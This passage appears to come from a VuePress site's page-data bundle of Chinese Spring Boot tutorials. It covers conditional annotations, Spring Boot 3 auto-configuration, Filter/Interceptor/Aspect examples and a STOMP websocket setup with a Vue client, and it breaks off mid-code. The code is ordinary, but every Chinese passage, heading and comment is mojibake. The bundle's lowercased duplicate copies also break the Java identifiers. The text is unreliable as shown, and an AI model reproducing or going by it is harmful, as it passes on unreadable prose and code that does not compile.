æ³¨è§£æ ¹æ® name æ¥è¯»å spring boot ç environment ç åéåå«çå±æ§ï¼æ ¹æ®å¶å¼ä¸ havingvalue çå¼æ¯è¾ç»æå³å®éç½®æ¯å¦çæãå¦ææ²¡ææå® havingvalue ï¼åªè¦å±æ§ä¸ä¸º false ï¼éç½®é½è½çæãmatcblfmissing ä¸ºä¾ æå³çå¦æ environment æ²¡æåå« âmessage.center.enabledâï¼éç½®ä¹è½çæï¼é»è®¤ä¸º falseã\n@conditionalonexpression ï¼å½è¡¨è¾¾å¼ä¸º true æ¶ï¼æä¼å®ä¾åä¸ä¸ª bean ï¼æ¯æ spel è¡¨è¾¾å¼ï¼æ¯å¦æ ¹æ®éç½®æä»¶ä¸­çæä¸ªå¼æ¥å³å®éç½®æ¯å¦çæã\n@conditionalonjava ï¼å½å­å¨æå®ç java çæ¬çæ¶åã\n\n\n# å­ãåçº§å° springboot3 ä½¿ç¨ starter\n\nå¨ springboot2.7 å°±å·²ç»è¯´æå»ºè®®ä½¿ç¨ meta-inf/spring/org.springframework.boot.autoconfigure.autoconfiguration.imports çæ¹å¼ä½ä¸ºå®ä¹èªå¨è£éæä»¶ä½ç½®ãèå¨ 3.0 çæ¬ï¼å·²ç»æ¯ç§»é¤äº meta-inf/spring.factoriesï¼æä»¥æä»¬ç»§ç»­éè¿ meta-inf/spring.factories æä»¶å®ä¹å°ä¸å¨çæã\n\n\x3c!-- æ·»å ä¾èµ --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-autoconfigure</artifactid>\n</dependency>\n\n\x3c!-- å¯¹ @configurationproperties çå¤ç --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-configuration-processor</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n@autoconfiguration\n@enableconfigurationproperties(value = testproperties.class)\npublic class testautoconfiguration {\n\n    @bean\n    public testtemplate testtemplate(){\n        return new testtemplate ();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n@autoconfiguration æ¯ spring boot2.7 æ°å¼å¥çï¼èªå¨éç½®ç±»å¿é¡»æ¾è¿ä¸é¢çæä»¶éæç®èªå¨éç½®ç±»\n\nå¨ meta-inf/spring/org.springframework.boot.autoconfigure.autoconfiguration.imports æä»¶éé¢æ·»å \n\ncom.spring.demo.test.testautoconfiguration\n\n\n1\n',charsets:{cjk:!0}},{title:"SpringBoot ä¹ FilterãInterceptorãAspect",frontmatter:{title:"SpringBoot ä¹ FilterãInterceptorãAspect",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/200/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/200.SpringBoot%20%E4%B9%8B%20Filter%E3%80%81Interceptor%E3%80%81Aspect.html",relativePath:"00.java/20.Spring/23.springboot/200.SpringBoot ä¹ FilterãInterceptorãAspect.md",key:"v-b3b797ce",path:"/spring/spring-boot/200/",headers:[{level:2,title:"Filter è¿æ»¤å¨",slug:"filter-è¿æ»¤å¨",normalizedTitle:"filter è¿æ»¤å¨",charIndex:140},{level:3,title:"ç¬¬ä¸ç§",slug:"ç¬¬ä¸ç§",normalizedTitle:"ç¬¬ä¸ç§",charIndex:192},{level:3,title:"ç¬¬äºç§",slug:"ç¬¬äºç§",normalizedTitle:"ç¬¬äºç§",charIndex:971},{level:2,title:"Interceptor æ¦æªå¨",slug:"interceptor-æ¦æªå¨",normalizedTitle:"interceptor æ¦æªå¨",charIndex:1678},{level:3,title:"ä¸ãå®ç°HandlerInterceptoræ¥å£",slug:"ä¸ãå®ç°handlerinterceptoræ¥å£",normalizedTitle:"ä¸ãå®ç° handlerinterceptor æ¥å£",charIndex:1798},{level:3,title:"äºãæ³¨åå°InterceptorRegistration",slug:"äºãæ³¨åå°interceptorregistration",normalizedTitle:"äºãæ³¨åå° interceptorregistration",charIndex:3314},{level:2,title:"Aspect åé¢",slug:"aspect-åé¢",normalizedTitle:"aspect åé¢",charIndex:4229}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"Filter è¿æ»¤å¨ ç¬¬ä¸ç§ ç¬¬äºç§ Interceptor æ¦æªå¨ ä¸ãå®ç°HandlerInterceptoræ¥å£ äºãæ³¨åå°InterceptorRegistration Aspect åé¢",content:'springboot æä¾äºéä¸­æ¦æªæºå¶ï¼å¯ä»¥æ¹ä¾¿æä»¬å¨ä¸å¡å±è¿è¡æ©å±ï¼çæçæ filterãinterceptorãAspectãå ControllerAdvice ä»ç¨äºå¤ç controller å¼å¸¸äºæ¯è¾å¤çï¼æä»¥åæ¬¡ä¸è¿å¤ä»ç»ãä¸å¾ä»ç»äºæºå¶æå¨å±æ¬¡ï¼\n\n\n\n\n# Filter è¿æ»¤å¨\n\nå®ç°æ¹å¼æä¸¤ç§ï¼è¿æ»¤å¨æ æ³è·å¾ä¸ä¸æãå¼æ éçå¯¹è±¡ï¼å¹¶å¯¹ææè¯·æ±èµ·ä½ç¨\n\n\n# ç¬¬ä¸ç§\n\nå®ç° Filter æ¥å£\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\nimport javax.servlet.*;\nimport java.io.IOException;\n\n@Component\n@Slf4j\npublic class MyFilter implements Filter {\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        log.info("åå§å");\n    }\n\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        log.info("æ§è¡");\n        filterChain.doFilter(servletRequest,servletResponse);\n    }\n\n    @Override\n    public void destroy() {\n        log.info("éæ¯");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# ç¬¬äºç§\n\néç½®å° Bean\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.MyFilter;\nimport org.springframework.boot.web.servlet.FilterRegistrationBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport java.util.Arrays;\n\n@Configuration\npublic class FilterConfig {\n\n    @Bean\n    public FilterRegistrationBean myFilter(){\n        FilterRegistrationBean filterRegistrationBean = new FilterRegistrationBean();\n        filterRegistrationBean.setFilter(new MyFilter());\n        filterRegistrationBean.setUrlPatterns(Arrays.asList("/*"));\n        return filterRegistrationBean;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# Interceptor æ¦æªå¨\n\næ¦æªå¨å¯ä»¥è·å IOC å®¹å¨ä¸­çåä¸ª bean, æ¦æªå¨æ¯åºäº java çåå°æºå¶çï¼æ¦æªå¨åªè½å¯¹ action è¯·æ±èµ·ä½ç¨ï¼æ¦æªå¨å¯ä»¥è®¿é® action ä¸ä¸æãå¼æ éçå¯¹è±¡ï¼ä½æ æ³è·ååæ°ã\n\n\n# ä¸ãå®ç° HandlerInterceptor æ¥å£\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.servlet.HandlerInterceptor;\nimport org.springframework.web.servlet.ModelAndView;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@Slf4j\n@Component\npublic class MyInterceptor implements HandlerInterceptor{\n\n    /**\n     * åè½æè¿°: æ§è¡æ¹æ³å\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        log.info("æ§è¡æ¹æ³å");\n        return false;\n    }\n\n    /**\n     * åè½æè¿°: æ§è¡æ¹æ³åï¼æå¼å¸¸ä¸æ§è¡\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @Override\n    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {\n        log.info("æ§è¡æ¹æ³åï¼æå¼å¸¸ä¸æ§è¡");\n    }\n\n    /**\n     * åè½æè¿°: æ§è¡å®ä¸å®ä¼æ§è¡\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @Override\n    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n        log.info("æ§è¡å®ä¸å®ä¼æ§è¡");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# äºãæ³¨åå° InterceptorRegistration\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.MyInterceptor;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistration;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\n\n@Configuration\npublic class InterceptorConfig implements WebMvcConfigurer{\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        //è¨»åTestInterceptoræ¦æªå¨ new æè æ³¨å¥ é½è¡\n        InterceptorRegistration registration = registry.addInterceptor(new MyInterceptor());\n        //ææè·¯å¾é½è¢«æ¦æª\n        registration.addPathPatterns("/**");\n        //æ·»å ä¸æ¦æªè·¯å¾\n        registration.excludePathPatterns("/","/error","/static/**");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# Aspect åé¢\n\nAspect å¯ä»¥èªå®ä¹è¦åå¥çç±»çè³åç»çæ¹æ³ï¼ç²åº¦æå°ã\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.aspectj.lang.JoinPoint;\nimport org.aspectj.lang.ProceedingJoinPoint;\nimport org.aspectj.lang.annotation.*;\nimport org.springframework.stereotype.Component;\n\n@Aspect\n@Component\n@Slf4j\npublic class MyAspect {\n\n//    @Before("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n//    public void Before(JoinPoint point){\n//        log.info("æ§è¡å");\n//    }\n//    @After("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n//    public void After(JoinPoint point){\n//        log.info("æ§è¡å");\n//    }\n//    @AfterThrowing("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n//    public void AfterThrowing(JoinPoint point){\n//        log.info("æ§è¡å¼å¸¸");\n//    }\n\n    @Around("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n    public Object Around(ProceedingJoinPoint point) throws Throwable {\n        log.info("MyAspect ç¯ç»æ§è¡");\n        log.info("MyAspect åæ° ",point.getArgs());\n        Object obj = point.proceed();\n        log.info("MyAspect æ§è¡å®æç»æ ",obj);\n        return obj;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n',normalizedContent:'springboot æä¾äºéä¸­æ¦æªæºå¶ï¼å¯ä»¥æ¹ä¾¿æä»¬å¨ä¸å¡å±è¿è¡æ©å±ï¼çæçæ filterãinterceptorãaspectãå controlleradvice ä»ç¨äºå¤ç controller å¼å¸¸äºæ¯è¾å¤çï¼æä»¥åæ¬¡ä¸è¿å¤ä»ç»ãä¸å¾ä»ç»äºæºå¶æå¨å±æ¬¡ï¼\n\n\n\n\n# filter è¿æ»¤å¨\n\nå®ç°æ¹å¼æä¸¤ç§ï¼è¿æ»¤å¨æ æ³è·å¾ä¸ä¸æãå¼æ éçå¯¹è±¡ï¼å¹¶å¯¹ææè¯·æ±èµ·ä½ç¨\n\n\n# ç¬¬ä¸ç§\n\nå®ç° filter æ¥å£\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.stereotype.component;\n\nimport javax.servlet.*;\nimport java.io.ioexception;\n\n@component\n@slf4j\npublic class myfilter implements filter {\n    @override\n    public void init(filterconfig filterconfig) throws servletexception {\n        log.info("åå§å");\n    }\n\n    @override\n    public void dofilter(servletrequest servletrequest, servletresponse servletresponse, filterchain filterchain) throws ioexception, servletexception {\n        log.info("æ§è¡");\n        filterchain.dofilter(servletrequest,servletresponse);\n    }\n\n    @override\n    public void destroy() {\n        log.info("éæ¯");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# ç¬¬äºç§\n\néç½®å° bean\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.myfilter;\nimport org.springframework.boot.web.servlet.filterregistrationbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport java.util.arrays;\n\n@configuration\npublic class filterconfig {\n\n    @bean\n    public filterregistrationbean myfilter(){\n        filterregistrationbean filterregistrationbean = new filterregistrationbean();\n        filterregistrationbean.setfilter(new myfilter());\n        filterregistrationbean.seturlpatterns(arrays.aslist("/*"));\n        return filterregistrationbean;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# interceptor æ¦æªå¨\n\næ¦æªå¨å¯ä»¥è·å ioc å®¹å¨ä¸­çåä¸ª bean, æ¦æªå¨æ¯åºäº java çåå°æºå¶çï¼æ¦æªå¨åªè½å¯¹ action è¯·æ±èµ·ä½ç¨ï¼æ¦æªå¨å¯ä»¥è®¿é® action ä¸ä¸æãå¼æ éçå¯¹è±¡ï¼ä½æ æ³è·ååæ°ã\n\n\n# ä¸ãå®ç° handlerinterceptor æ¥å£\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.stereotype.component;\nimport org.springframework.web.servlet.handlerinterceptor;\nimport org.springframework.web.servlet.modelandview;\n\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\n\n@slf4j\n@component\npublic class myinterceptor implements handlerinterceptor{\n\n    /**\n     * åè½æè¿°: æ§è¡æ¹æ³å\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @override\n    public boolean prehandle(httpservletrequest request, httpservletresponse response, object handler) throws exception {\n        log.info("æ§è¡æ¹æ³å");\n        return false;\n    }\n\n    /**\n     * åè½æè¿°: æ§è¡æ¹æ³åï¼æå¼å¸¸ä¸æ§è¡\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @override\n    public void posthandle(httpservletrequest request, httpservletresponse response, object handler, modelandview modelandview) throws exception {\n        log.info("æ§è¡æ¹æ³åï¼æå¼å¸¸ä¸æ§è¡");\n    }\n\n    /**\n     * åè½æè¿°: æ§è¡å®ä¸å®ä¼æ§è¡\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @override\n    public void aftercompletion(httpservletrequest request, httpservletresponse response, object handler, exception ex) throws exception {\n        log.info("æ§è¡å®ä¸å®ä¼æ§è¡");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# äºãæ³¨åå° interceptorregistration\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.myinterceptor;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.web.servlet.config.annotation.interceptorregistration;\nimport org.springframework.web.servlet.config.annotation.interceptorregistry;\nimport org.springframework.web.servlet.config.annotation.webmvcconfigurer;\n\n\n@configuration\npublic class interceptorconfig implements webmvcconfigurer{\n\n    @override\n    public void addinterceptors(interceptorregistry registry) {\n        //è¨»åtestinterceptoræ¦æªå¨ new æè æ³¨å¥ é½è¡\n        interceptorregistration registration = registry.addinterceptor(new myinterceptor());\n        //ææè·¯å¾é½è¢«æ¦æª\n        registration.addpathpatterns("/**");\n        //æ·»å ä¸æ¦æªè·¯å¾\n        registration.excludepathpatterns("/","/error","/static/**");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# aspect åé¢\n\naspect å¯ä»¥èªå®ä¹è¦åå¥çç±»çè³åç»çæ¹æ³ï¼ç²åº¦æå°ã\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.aspectj.lang.joinpoint;\nimport org.aspectj.lang.proceedingjoinpoint;\nimport org.aspectj.lang.annotation.*;\nimport org.springframework.stereotype.component;\n\n@aspect\n@component\n@slf4j\npublic class myaspect {\n\n//    @before("execution(* com.wt.cloud.web.helloweb.*(..))")\n//    public void before(joinpoint point){\n//        log.info("æ§è¡å");\n//    }\n//    @after("execution(* com.wt.cloud.web.helloweb.*(..))")\n//    public void after(joinpoint point){\n//        log.info("æ§è¡å");\n//    }\n//    @afterthrowing("execution(* com.wt.cloud.web.helloweb.*(..))")\n//    public void afterthrowing(joinpoint point){\n//        log.info("æ§è¡å¼å¸¸");\n//    }\n\n    @around("execution(* com.wt.cloud.web.helloweb.*(..))")\n    public object around(proceedingjoinpoint point) throws throwable {\n        log.info("myaspect ç¯ç»æ§è¡");\n        log.info("myaspect åæ° ",point.getargs());\n        object obj = point.proceed();\n        log.info("myaspect æ§è¡å®æç»æ ",obj);\n        return obj;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n',charsets:{cjk:!0}},{title:"SpringBoot ä¹ Stomp ä½¿ç¨å vue ç¸éç½®",frontmatter:{title:"SpringBoot ä¹ Stomp ä½¿ç¨å vue ç¸éç½®",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/202/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/23.springboot/202.SpringBoot%20%E4%B9%8B%20Stomp%20%E4%BD%BF%E7%94%A8%E5%92%8C%20vue%20%E7%9B%B8%E9%85%8D%E7%BD%AE.html",relativePath:"00.java/20.Spring/23.springboot/202.SpringBoot ä¹ Stomp ä½¿ç¨å vue ç¸éç½®.md",key:"v-63e5293d",path:"/spring/spring-boot/202/",headers:[{level:2,title:"åç«¯ä»£ç ",slug:"åç«¯ä»£ç ",normalizedTitle:"åç«¯ä»£ç ",charIndex:2},{level:2,title:"åç«¯ä»£ç ",slug:"åç«¯ä»£ç ",normalizedTitle:"åç«¯ä»£ç ",charIndex:2352}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"åç«¯ä»£ç  åç«¯ä»£ç ",content:'# åç«¯ä»£ç \n\nä¾èµ\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-websocket</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.messaging.simp.config.MessageBrokerRegistry;\nimport org.springframework.web.socket.config.annotation.EnableWebSocketMessageBroker;\nimport org.springframework.web.socket.config.annotation.StompEndpointRegistry;\nimport org.springframework.web.socket.config.annotation.WebSocketMessageBrokerConfigurer;\n\n/**\n * éè¿EnableWebSocketMessageBroker å¼å¯ä½¿ç¨STOMPåè®®æ¥ä¼ è¾åºäºä»£ç(message broker)çæ¶æ¯,æ­¤æ¶æµè§å¨æ¯æä½¿ç¨@MessageMapping å°±åæ¯æ@RequestMappingä¸æ ·ã\n * @author zhenghuasheng\n */\n@Configuration\n@EnableWebSocketMessageBroker\npublic class WebSocketConfig implements WebSocketMessageBrokerConfigurer {\n\n    /**\n     * æ³¨åstompçç«¯ç¹\n     */\n    @Override\n    public void registerStompEndpoints(StompEndpointRegistry registry) {\n        // ç¨æ·è®¢éä¸»é¢çåç¼ /topic ä»£è¡¨åå¸å¹¿æ­ï¼å³ç¾¤å /queue ä»£è¡¨ç¹å¯¹ç¹ï¼å³åæå®ç¨æ·\n        registry.addEndpoint("/webSocket")\n                // è®¾ç½®è·¨å\n                .setAllowedOrigins("*")\n                //æ·»å socketæ¦æªå¨ï¼ç¨äºä»è¯·æ±ä¸­è·åå®¢æ·ç«¯æ è¯åæ° ç®åæ²¡ä»ä¹ç¨ï¼å¯ä»¥å»æ\n                .addInterceptors(new MyHandShakeInterceptor())\n                .withSockJS();\n    }\n\n    /**\n     * éç½®æ¶æ¯ä»£ç(message broker)\n     * @param registry\n     */\n    @Override\n    public void configureMessageBroker(MessageBrokerRegistry registry) {\n//        ThreadPoolTaskScheduler te = new ThreadPoolTaskScheduler();\n//        te.setPoolSize(1);\n//        te.setThreadNamePrefix("wss-heartbeat-thread-");\n//        te.initialize();\n        // ä»£çç¨ä¸å°\n//        registry.enableStompBrokerRelay().setClientLogin("111").setClientPasscode("111").setRelayPort(8005);\n        // è®¢éBrokeråç§°\n        registry.enableSimpleBroker("/queue","/topic")\n                // ç¬¬ä¸ä¸ªåæ°è¡¨ç¤ºæå¡å¨åå¥æåéå¿è·³çé¢çã ç¬¬äºä¸ªåæ°è¡¨ç¤ºå®¢æ·ç«¯åéå¿è·³æ¶é´\n//                .setHeartbeatValue(new long[]{15000,3000})\n//                .setTaskScheduler(te)\n        ;\n        // å¨å±ä½¿ç¨çæ¶æ¯åç¼ï¼å®¢æ·ç«¯è®¢éè·¯å¾ä¸ä¼ä½ç°åºæ¥ï¼\n//        registry.setApplicationDestinationPrefixes("/app");\n        // ç¹å¯¹ç¹ä½¿ç¨çè®¢éåç¼ï¼å®¢æ·ç«¯è®¢éè·¯å¾ä¸ä¼ä½ç°åºæ¥ï¼ï¼ä¸è®¾ç½®çè¯ï¼é»è®¤ä¹æ¯/user/\n        // registry.setUserDestinationPrefix("/user/");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# åç«¯ä»£ç \n\nä¾èµ\n\nnpm install sockjs-client\nnpm install stompjs\nnpm install net\nnpm install vue-stomp\n\n\n1\n2\n3\n4\n\n\nå°è£ stomp.js\n\nimport SockJS from \'sockjs-client\'\nimport Stomp from \'webstomp-client\'\n\nexport default {\n  // æ¯å¦å¯ç¨æ¥å¿ é»è®¤å¯ç¨\n  debug:true,\n  // å®¢æ·ç«¯è¿æ¥ä¿¡æ¯\n  stompClient:{},\n  // åå§å\n  init(callBack){\n    const socket = new SockJS(\'http://127.0.0.1:8005/webSocket\')\n    this.stompClient = Stomp.over(socket)\n    this.stompClient.hasDebug = this.debug\n    this.stompClient.connect({},suce =>{\n      this.console("è¿æ¥æå,ä¿¡æ¯å¦ä¸ â");\n      this.console(this.stompClient);\n      if(callBack){\n        callBack();\n      }\n    },err => {\n      if(err) {\n        this.console("è¿æ¥å¤±è´¥,ä¿¡æ¯å¦ä¸ â")\n        this.console(err)\n      }\n    });\n  },\n  // è®¢é\n  sub(address,callBack){\n    if(!this.stompClient.connected){\n      this.console("æ²¡æè¿æ¥,æ æ³è®¢é");\n      return;\n    }\n    // çæ id\n    let timestamp= new Date().getTime() + address\n    this.console("è®¢éæå -> "+address)\n    this.stompClient.subscribe(address,message => {\n      this.console(address+" è®¢éæ¶æ¯éç¥,ä¿¡æ¯å¦ä¸ â")\n      this.console(message)\n      let data = message.body;\n      callBack(data);\n    },{\n      id: timestamp\n    })\n  },\n  unSub(address){\n    if(!this.stompClient.connected){\n      this.console("æ²¡æè¿æ¥,æ æ³åæ¶è®¢é -> "+address);\n      return;\n    }\n    let id = ""\n    for(let item in this.stompClient.subscriptions){\n      if(item.endsWith(address)){\n        id = item;\n        break;\n      }\n    }\n    this.stompClient.unsubscribe(id);\n    this.console("åæ¶è®¢éæå -> id:"+ id + " address:"+address)\n  },\n  // æ­å¼è¿æ¥\n  disconnect(callBack){\n    if(!this.stompClient.connected){\n      this.console("æ²¡æè¿æ¥,æ æ³æ­å¼è¿æ¥");\n      return;\n    }\n    this.stompClient.disconnect(() =>{\n      console.log("æ­å¼æå")\n      if(callBack){\n        callBack()\n      }\n    });\n  },\n  // åä½ ç§\n  reconnect(time){\n    setInterval(() =>{\n      if(!this.stompClient.connected){\n        this.console("éæ°è¿æ¥ä¸­...")\n        this.init()\n      }\n    },time * 1000)\n  },\n  console(msg){\n    if(this.debug){\n      console.log(msg);\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n\n\nä»¥ä¸æ¯æèªå·±å°è£çä¸ä¸ª stomp.jsï¼å»ºè®®å¨ç»å½ä¹åè°ç¨ initï¼å¹¶ä¸ä¿è¯ è®¢é å init ç­ææ API å¨ä¸ä¸ªæä»¶ä¸­ä½¿ç¨ï¼å¦åä¼ undefinedãå¯ä»¥ä½¿ç¨ eventBus æ¥ä¼ éæ°æ®ã\n\nå·ä½ä½¿ç¨\n\n  mounted() {\n    // åå§å\n    stomp.init(() =>{\n      // åå§åæå å°±æ§è¡è®¢é\n      stomp.sub("/topic",data =>{\n        console.log(data)\n      })\n      stomp.sub("/topic1",data =>{\n        console.log(data)\n      })\n      // åæ¶è®¢é\n      stomp.unSub("/topic")\n    })\n    //  å¯ç¨éè¿ 5ç§æ£æµä¸æ¬¡\n    stomp.reconnect(5)\n  },\n  destroyed() {\n    stomp.disconnect()\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nè¿æ¥éäºä»¥åï¼å¦æè¯´åç«¯ç¨ websocket åªæ¯ä¸ºäºæ¥æ¶åç«¯çæ¶æ¯ï¼é£ä¹å³äº topic å¯ä»¥éä¾¿è®¾ç½®ï¼è¿éçéä¾¿æææ¯åç«¯ä¸éè¦å»å¨ configureMessageBroker éè®¾ç½®ä»»ä½ä¸è¥¿ï¼åªéè¦ååç«¯å®ä¹æ¸æ¥ topicï¼åç«¯å¯ä»¥å¨æ topic ç»åç«¯ãå¦ä¸ï¼\n\n\n\n\n\n',normalizedContent:'# åç«¯ä»£ç \n\nä¾èµ\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-websocket</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.messaging.simp.config.messagebrokerregistry;\nimport org.springframework.web.socket.config.annotation.enablewebsocketmessagebroker;\nimport org.springframework.web.socket.config.annotation.stompendpointregistry;\nimport org.springframework.web.socket.config.annotation.websocketmessagebrokerconfigurer;\n\n/**\n * éè¿enablewebsocketmessagebroker å¼å¯ä½¿ç¨stompåè®®æ¥ä¼ è¾åºäºä»£ç(message broker)çæ¶æ¯,æ­¤æ¶æµè§å¨æ¯æä½¿ç¨@messagemapping å°±åæ¯æ@requestmappingä¸æ ·ã\n * @author zhenghuasheng\n */\n@configuration\n@enablewebsocketmessagebroker\npublic class websocketconfig implements websocketmessagebrokerconfigurer {\n\n    /**\n     * æ³¨åstompçç«¯ç¹\n     */\n    @override\n    public void registerstompendpoints(stompendpointregistry registry) {\n        // ç¨æ·è®¢éä¸»é¢çåç¼ /topic ä»£è¡¨åå¸å¹¿æ­ï¼å³ç¾¤å /queue ä»£è¡¨ç¹å¯¹ç¹ï¼å³åæå®ç¨æ·\n        registry.addendpoint("/websocket")\n                // è®¾ç½®è·¨å\n                .setallowedorigins("*")\n                //æ·»å socketæ¦æªå¨ï¼ç¨äºä»è¯·æ±ä¸­è·åå®¢æ·ç«¯æ è¯åæ° ç®åæ²¡ä»ä¹ç¨ï¼å¯ä»¥å»æ\n                .addinterceptors(new myhandshakeinterceptor())\n                .withsockjs();\n    }\n\n    /**\n     * éç½®æ¶æ¯ä»£ç(message broker)\n     * @param registry\n     */\n    @override\n    public void configuremessagebroker(messagebrokerregistry registry) {\n//        threadpooltaskscheduler te = new threadpooltaskscheduler();\n//        te.setpoolsize(1);\n//        te.setthreadnameprefix("wss-heartbeat-thread-");\n//        te.initialize();\n        // ä»£çç¨ä¸å°\n//        registry.enablestompbrokerrelay().setclientlogin("111").setclientpasscode("111").setrelayport(8005);\n        // è®¢ébrokeråç§°\n        registry.enablesimplebroker("/queue","/topic")\n                // 